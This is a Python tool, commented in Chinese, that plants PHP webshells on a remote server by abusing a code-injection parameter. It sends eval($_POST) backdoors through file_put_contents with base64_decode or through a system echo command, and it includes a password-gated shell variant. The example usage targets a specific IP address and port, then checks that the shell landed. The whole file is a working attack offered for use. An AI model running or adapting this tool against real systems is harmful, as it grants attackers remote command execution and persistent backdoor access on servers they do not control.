from pyexpat.errors import messages

import requests
import base64


from urllib3.filepost import writer


class WebShellWriter:
    def __init__(self, url, webshell_path="shell.php", payload=None, timeout=10):
        """
        初始化 WebShellWriter。

        :param url: 目标 URL。
        :param webshell_path: Webshell 写入路径，默认为 "shell.php"。
        :param timeout: 请求超时时间（秒）。
        """
        self.url = url
        self.webshell_path = webshell_path
        self.payload = payload or "<?php eval($_POST[\"cmd\"]);?>"
        self.timeout = timeout

    def write_shell(self, method="POST", headers=None, data=None, write_mode=1, parameter=None, querys=None):
        """
        写入 Webshell 到目标路径。
        """
        # 自定义数据
        if write_mode == 0:
            data = data
        # file_put_contents base64 写马
        elif write_mode == 1:
            data = {
                parameter: "file_put_contents('{}',base64_decode('{}'));".format(self.webshell_path, base64.b64encode(self.payload.encode()).decode()),
            }
        # system echo + base64 写马
        elif write_mode == 2:
            encode_payload = base64.b64encode(self.payload.encode("utf-8")).decode("utf-8")
            data = {
                parameter: """system("echo '{}' | base64 -d > {}")""".format(encode_payload, self.webshell_path),
            }
        try:
            # 选择请求方法
            if method.upper() == "POST":
                print(data)
                response = requests.post(self.url, data=data, headers=headers, params={**data, **(querys or {})},timeout=self.timeout)
                # print(response.text)
            elif method.upper() == "GET":
                response = requests.get(self.url, params={**data, **(querys or {})}, headers=headers,
                                        timeout=self.timeout)
            else:
                raise ValueError("Unsupported HTTP method. Use GET or POST.")

            check_response = requests.get(url=self.url + self.webshell_path, timeout=self.timeout)
            # 检查响应
            if response.status_code == 200 and check_response.status_code == 200:
                return True, f"Shell written successfully to {self.url,self.webshell_path}"
            else:
                return False, f"Failed to write shell. HTTP Status: {self.url,response.status_code}"

        except requests.exceptions.RequestException as e:
            return False, f"Request failed: {e}"


# 示例用法
if __name__ == "__main__":
    with open("../webshells/pass_shell.php") as f:
        shell = f.read()

    # 目标信息
    target_url = "http://219.217.199.214:8300/"
    target_path = "shell.php"

    # 创建 WebShellWriter 实例
    writer = WebShellWriter(url=target_url, webshell_path=target_path,payload=shell)

    data = {
        "code": "file_put_contents('shell.php','<?php eval($_POST[\"a\"]);?>');",
        # 由于PHP的解析特性，马只能用单引号包裹
    }
    # pass=qyzy
    shell_with_pass = {
        "code12": "file_put_contents('shell.php','<?php if( md5($_GET[\"pass\"]) === \"1a50a7026b30cd2c927487b2da37ec0e\"){ eval($_POST[\"cmd\"]);}');?>",
    }
    querys = {
        "pass": "qyzy"
    }
    # 发起写入请求
    status, message = writer.write_shell(data=shell_with_pass, write_mode=1, querys=querys,parameter="code")

    # status, message = writer.write_shell(method="POST", write_mode=1, parameter="code12")
    #
    # status, message = writer.write_shell(method="POST", write_mode=2, parameter="code12")
    print(message)
